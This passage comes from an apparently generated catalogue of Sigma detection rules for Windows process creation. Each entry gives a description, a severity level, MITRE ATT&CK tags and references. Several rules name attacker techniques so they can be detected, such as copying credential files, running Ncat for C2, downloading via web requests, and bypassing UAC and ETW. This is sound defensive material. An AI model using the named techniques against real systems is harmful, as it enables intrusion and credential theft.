* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regini.yml

* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regini

    
### Suspicious Service Path Modification
    
    Detects service path modification to PowerShell or cmd.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_service_path_modification.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.md

    
### Run PowerShell Script from ADS
    
    Detects PowerShell script execution from Alternate Data Stream (ADS)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_run_powershell_script_from_ads.yml
* https://github.com/p0shkatz/Get-ADS/blob/master/Get-ADS.ps1

    
### Ke3chang Registry Key Modifications
    
    Detects Registry modifications performed by Ke3chang malware in campaigns running in 2019 and 2020

    * Level: critical
    * MITRE: attack.g0004
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_ke3chang_regadd.yml
* https://www.verfassungsschutz.de/embed/broschuere-2020-06-bfv-cyber-brief-2020-01.pdf

* https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaces-with-new-tidepool-malware/

    
### Suspicious Bitsadmin Job via PowerShell
    
    Detect download by BITS jobs via PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.persistence
    * MITRE: attack.t1197
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_bitsjob.yml
* https://eqllib.readthedocs.io/en/latest/analytics/ec5180c9-721a-460f-bddc-27539a284273.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md

    
### RunXCmd Tool Execution As System
    
    Detects the use of RunXCmd tool for command execution

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    * MITRE: attack.s0029
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_tool_runx_as_system.yml
* https://www.d7xtech.com/free-software/runx/

* https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/

    
### Malicious PE Execution by Microsoft Visual Studio Debugger
    
    There is an option for a MS VS Just-In-Time Debugger "vsjitdebugger.exe" to launch specified executable and attach a debugger. This option may be used adversaries to execute malicious code by signed verified binary. The debugger is installed alongside with Microsoft Visual Studio package.

    * Level: medium
    * MITRE: attack.t1218
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_use_of_vsjitdebugger_bin.yml
* https://twitter.com/pabraeken/status/990758590020452353

* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Vsjitdebugger.yml

* https://docs.microsoft.com/en-us/visualstudio/debugger/debug-using-the-just-in-time-debugger?view=vs-2019

    
### PowerShell Downgrade Attack
    
    Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_downgrade_attack.yml
* http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/

    
### Conhost Parent Process Executions
    
    Detects the conhost execution as parent process. Can be used to evaded defense mechanism.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_conhost.yml
* http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/

    
### Copying Sensitive Files with Credential Data
    
    Files with well-known filenames (sensitive files with credential data) copying

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.003
    * MITRE: car.2013-07-001
    * MITRE: attack.s0404
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_copying_sensitive_files_with_credential_data.yml
* https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/

* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

* https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/

    
### Highly Relevant Renamed Binary
    
    Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml
* https://attack.mitre.org/techniques/T1036/

* https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html

* https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html

    
### Serv-U Exploitation CVE-2021-35211 by DEV-0322
    
    Detects patterns as noticed in exploitation of Serv-U CVE-2021-35211 vulnerability by threat group DEV-0322

    * Level: critical
    * MITRE: attack.persistence
    * MITRE: attack.t1136.001
    * MITRE: cve.2021.35211
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_servu_exploitation_cve_2021_35211.yml
* https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/

    
### Suspicious Netsh Discovery Command
    
    Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1016
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_netsh_command.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md#atomic-test-2---list-windows-firewall-rules

    
### TropicTrooper Campaign November 2018
    
    Detects TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_tropictrooper.yml
* https://cloudblogs.microsoft.com/microsoftsecure/2018/11/28/windows-defender-atp-device-risk-score-exposes-new-cyberattack-drives-conditional-access-to-protect-networks/

    
### CMSTP Execution Process Creation
    
    Detects various indicators of Microsoft Connection Manager Profile Installer execution

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1218.003
    * MITRE: attack.g0069
    * MITRE: car.2019-04-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml
* https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/

    
### Suspicious Extrac32 Execution
    
    Download or Copy file with Extrac32

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_lolbas_extrac32.yml
* https://lolbas-project.github.io/lolbas/Binaries/Extrac32/

    
### Suspicious LOLBIN AccCheckConsole
    
    Detects suspicious LOLBIN AccCheckConsole execution with parameters as used to load an arbitrary DLL

    * Level: high
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_acccheckconsole.yml
* https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340

* https://twitter.com/bohops/status/1477717351017680899?s=12

    
### Capture a Network Trace with netsh.exe
    
    Detects capture a network trace via netsh.exe trace functionality

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.credential_access
    * MITRE: attack.t1040
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_netsh_packet_capture.yml
* https://blogs.msdn.microsoft.com/canberrapfe/2012/03/30/capture-a-network-trace-without-installing-anything-capture-a-network-trace-of-a-reboot/

    
### Quick Execution of a Series of Suspicious Commands
    
    Detects multiple suspicious process in a limited timeframe

    * Level: low
    * MITRE: car.2013-04-002
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_multiple_susp_cli.yml
* https://car.mitre.org/wiki/CAR-2013-04-002

    
### Windows Credential Manager Access via VaultCmd
    
    List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1555.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_vaultcmd.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.004/T1555.004.md#atomic-test-1---access-saved-credentials-via-vaultcmd

    
### REvil Kaseya Incident Malware Patterns
    
    Detects process command line patterns and locations used by REvil group in Kaseya incident (can also match on other malware)

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059
    * MITRE: attack.g0115
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_revil_kaseya.yml
* https://community.sophos.com/b/security-blog/posts/active-ransomware-attack-on-kaseya-customers

* https://www.joesandbox.com/analysis/443736/0/html

* https://doublepulsar.com/kaseya-supply-chain-attack-delivers-mass-ransomware-event-to-us-companies-76e4ec6ec64b

* https://therecord.media/revil-ransomware-executes-supply-chain-attack-via-malicious-kaseya-update/

* https://blog.truesec.com/2021/07/04/kaseya-supply-chain-attack-targeting-msps-to-deliver-revil-ransomware/

    
### Rundll32 From Abnormal Drive
    
    Detects rundll32.exe executing from an abnormal drive such as a mounted ISO.

    * Level: medium
    * MITRE: attack.t1218.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_rundll32_not_from_c_drive.yml
* https://thedfirreport.com/2021/12/13/diavol-ransomware/

    
### PsExec/PAExec Flags
    
    Detects suspicious flags used by PsExec and PAExec but no usual program name in command line

    * Level: high
    * MITRE: attack.develop_capabilities
    * MITRE: attack.t1587.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_psexex_paexec_flags.yml
* https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

* https://www.poweradmin.com/paexec/

* https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html

    
### Turla Group Lateral Movement
    
    Detects automated lateral movement by Turla group

    * Level: medium
    * MITRE: attack.g0010
    * MITRE: attack.execution
    * MITRE: attack.t1059
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    * MITRE: attack.discovery
    * MITRE: attack.t1083
    * MITRE: attack.t1135
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_turla_commands_medium.yml
* https://securelist.com/the-epic-turla-operation/65545/

    
### Hurricane Panda Activity
    
    Detects Hurricane Panda Activity

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.g0009
    * MITRE: attack.t1068
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_hurricane_panda.yml
* https://www.crowdstrike.com/blog/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/

    
### Suspicious PowerShell Sub Processes
    
    Detects suspicious sub processes spawned by PowerShell

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_sub_processes.yml
* https://twitter.com/ankit_anubhav/status/1518835408502620162

    
### Suspicious Calculator Usage
    
    Detects suspicious use of calc.exe with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_calc.yml
* https://twitter.com/ItsReallyNick/status/1094080242686312448

    
### Execute From Alternate Data Streams
    
    Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_alternate_data_streams.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md

    
### NirCmd Tool Execution As LOCAL SYSTEM
    
    Detects the use of NirCmd tool for command execution as SYSTEM user

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    * MITRE: attack.s0029
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_tool_nircmd_as_system.yml
* https://www.nirsoft.net/utils/nircmd.html

* https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/

* https://www.nirsoft.net/utils/nircmd2.html#using

    
### Registry Defender Exclusions
    
    Qbot used reg.exe to add Defender folder exceptions for folders within AppData and ProgramData.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_reg_defender_exclusion.yml
* https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/

* https://redcanary.com/threat-detection-report/threats/qbot/

    
### Possible Ransomware or Unauthorized MBR Modifications
    
    Detects, possibly, malicious unauthorized usage of bcdedit.exe

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070
    * MITRE: attack.persistence
    * MITRE: attack.t1542.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_bcdedit.yml
* https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set

* https://twitter.com/malwrhunterteam/status/1372536434125512712/photo/2

    
### Suspicious HWP Sub Processes
    
    Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation

    * Level: high
    * MITRE: attack.initial_access
    * MITRE: attack.t1566.001
    * MITRE: attack.execution
    * MITRE: attack.t1203
    * MITRE: attack.t1059.003
    * MITRE: attack.g0032
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_hwp_exploits.yml
* https://www.securitynewspaper.com/2016/11/23/technical-teardown-exploit-malware-hwp-files/

* https://www.hybrid-analysis.com/search?query=context:74940dcc5b38f9f9b1a0fea760d344735d7d91b610e6d5bd34533dd0153402c5&from_sample=5db135000388385a7644131f&block_redirect=1

* https://twitter.com/cyberwar_15/status/1187287262054076416

* https://blog.alyac.co.kr/1901

* https://en.wikipedia.org/wiki/Hangul_(word_processor)

    
### Snatch Ransomware
    
    Detects specific process characteristics of Snatch ransomware word document droppers

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1204
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_crime_snatch_ransomware.yml
* https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/

    
### Windows Suspicious Use Of Web Request in CommandLine
    
    Detects the use of various web request with commandline tools or Windows PowerShell command,methods (including aliases)

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd.yml
* https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/

* https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell

    
### Java Running with Remote Debugging
    
    Detects a JAVA process running with remote debugging allowing more than just localhost to connect

    * Level: medium
    * MITRE: attack.t1203
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_vul_java_remote_debugging.yml
    
### CleanWipe Usage
    
    Detects the use of CleanWipe a tool usually used to delete Symantec test.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cleanwipe.yml
* https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/CleanWipe

    
### Executable Used by PlugX in Uncommon Location
    
    Detects the execution of an executable that is typically used by PlugX for DLL side loading started from an uncommon location

    * Level: high
    * MITRE: attack.s0013
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_plugx_susp_exe_locations.yml
* http://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/

* https://countuponsecurity.com/2017/06/07/threat-hunting-in-the-enterprise-with-appcompatprocessor/

    
### Unidentified Attacker November 2018
    
    A sigma rule detecting an unidetefied attacker who used phishing emails to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29 campaign in 2016.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_unidentified_nov_18.yml
* https://twitter.com/DrunkBinary/status/1063075530180886529

    
### Suspicious AdvancedRun Runas Priv User
    
    Detects the execution of AdvancedRun utitlity in the context of the TrustedInstaller, SYSTEM, Local Service or Network Service accounts

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_advancedrun_priv_user.yml
* https://twitter.com/splinter_code/status/1483815103279603714

* https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3

* https://elastic.github.io/security-research/malware/2022/01/01.operation-bleeding-bear/article/

* https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/

    
### Discover Private Keys
    
    Adversaries may search for private key certificate files on compromised systems for insecurely stored credential

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_discover_private_keys.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.004/T1552.004.md

    
### Run PowerShell Script from Redirected Input Stream
    
    Detects PowerShell script execution via input stream redirect

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_run_powershell_script_from_input_stream.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/LOLUtilz/OSBinaries/Powershell.yml

* https://twitter.com/Moriarty_Meng/status/984380793383370752

    
### Suspicious Call by Ordinal
    
    Detects suspicious calls of DLLs in rundll32.dll exports by ordinal

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_rundll32_by_ordinal.yml
* https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/

* https://github.com/Neo23x0/DLLRunner

* https://twitter.com/cyb3rops/status/1186631731543236608

* https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine/

    
### Emissary Panda Malware SLLauncher
    
    Detects the execution of DLL side-loading malware used by threat group Emissary Panda aka APT27

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_apt_emissarypanda_sep19.yml
* https://app.any.run/tasks/579e7587-f09d-4aae-8b07-472833262965

* https://twitter.com/cyb3rops/status/1168863899531132929

    
### WMI Reconnaissance List Remote Services
    
    An adversary might use WMI to check if a certain Remote Service is running on a remote device.
When the test completes, a service information will be displayed on the screen if it exists.
A common feedback message is that "No instance(s) Available" if the service queried is not running.
A common error message is "Node - (provided IP or default) ERROR Description =The RPC server is unavailable" if the provided remote host is unreacheable


    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_wmic_remote_service.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md

* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic

    
### Script Interpreter Execution From Suspicious Folder
    
    Detects a suspicious script executions in temporary folders or folders accessible by environment variables

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_script_exec_from_env_folder.yml
* https://www.virustotal.com/gui/file/91ba814a86ddedc7a9d546e26f912c541205b47a853d227756ab1334ade92c3f

    
### Suspicious AdFind Execution
    
    Detects the execution of a AdFind for Active Directory enumeration

    * Level: medium
    * MITRE: attack.discovery
    * MITRE: attack.t1018
    * MITRE: attack.t1087.002
    * MITRE: attack.t1482
    * MITRE: attack.t1069.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_adfind.yml
* https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx

* https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md

* https://thedfirreport.com/2020/05/08/adfind-recon/

    
### Suspicious Csc.exe Source File Folder
    
    Detects a suspicious execution of csc.exe, which uses a source in a suspicious folder (e.g. AppData)

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_csc_folder.yml
* https://securityboulevard.com/2019/08/agent-tesla-evading-edr-by-removing-api-hooks/

* https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf

* https://app.any.run/tasks/c6993447-d1d8-414e-b856-675325e5aa09/

* https://twitter.com/gN3mes1s/status/1206874118282448897

    
### Suspicious Add Scheduled Task Parent
    
    Detects suspicious scheduled task creations from a parent stored in a temporary folder

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_schtasks_parent.yml
* https://app.any.run/tasks/649e7b46-9bec-4d05-98a5-dfa9a13eaae5/

    
### Suspicius Schtasks From Env Var Folder
    
    Detects Schtask creations that point to a folder references in environment variables or often used by malware

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_schtasks_env_folder.yml
* https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/

* https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04

    
### WSL Execution
    
    Detects Possible usage of Windows Subsystem for Linux (WSL) binary as a LOLBIN

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.t1202
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_wsl_lolbin.yml
* https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/

    
### CVE-2021-26857 Exchange Exploitation
    
    Detects possible successful exploitation for vulnerability described in CVE-2021-26857 by looking for | abnormal subprocesses spawning by Exchange Server’s Unified Messaging service

    * Level: critical
    * MITRE: attack.t1203
    * MITRE: attack.execution
    * MITRE: cve.2021.26857
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_cve_2021_26857_msexchange.yml
* https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/

    
### MSExchange Transport Agent Installation
    
    Detects the Installation of a Exchange Transport Agent

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1505.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_win_exchange_transportagent.yml
* https://twitter.com/blueteamsec1/status/1401290874202382336?s=20

    
### Suspicious Svchost Process
    
    Detects a suspicious svchost process start

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_svchost.yml
    
### Suspicious Encoded PowerShell Command Line
    
    Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_powershell_enc_cmd.yml
* https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e

    
### Suspicious PowerShell Cmdline
    
    Detects the PowerShell command lines with reversed strings

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_powershell_cmdline_reversed_strings.yml
* https://2019.offzone.moscow/ru/report/hunting-for-powershell-abuses/

* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse?slide=66

    
### Ncat Execution
    
    Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1095
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_netcat_execution.yml
* https://nmap.org/ncat/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.md

    
### Explorer NOUACCHECK Flag
    
    Detects suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_explorer_nouaccheck.yml
* https://twitter.com/ORCA6665/status/1496478087244095491

    
### COMPlus_ETWEnabled Command Line Arguments
    
    Potential adversaries stopping ETW providers recording loaded .NET assemblies.

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_etw_modification_cmdline.yml
* https://twitter.com/_xpn_/status/1268712093928378368

* https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr

* https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables

* https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38

* https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39

* https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_

* https://bunnyinside.com/?term=f71e8cb9c76a

* http://managed670.rssing.com/chan-5590147/all_p1.html

* https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code

    
### InfDefaultInstall.exe .inf Execution
    
    Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_infdefaultinstall.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md#atomic-test-4---infdefaultinstallexe-inf-execution

* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml

    
### Imports Registry Key From an ADS
    
    Detects the import of a alternate datastream to the registry with regedit.exe.

    * Level: high
    * MITRE: attack.t1112
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml

* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

    
### ZOHO Dctask64 Process Injection
    
    Detects suspicious process injection using ZOHO's dctask64.exe

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/process_creation/proc_creation_win_susp_dctask64_proc_inject.yml
* https://twitter.com/gN3mes1s/status/1222088214581825540

* https://twitter.com/gN3mes1s/status/1222095963789111296

* https://twitter.com/gN3mes1s/status/1222095371175911424

    
### Tasks Folder Evasion
    
    The Tasks folder in system32 and syswow64 are globally writable paths. Adversaries can take advantage of this and load or influence any script hosts or ANY .NET Application in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.persistence
    * MITRE: attack.execution
    * MITRE: attack.t1574.002
    
References: 
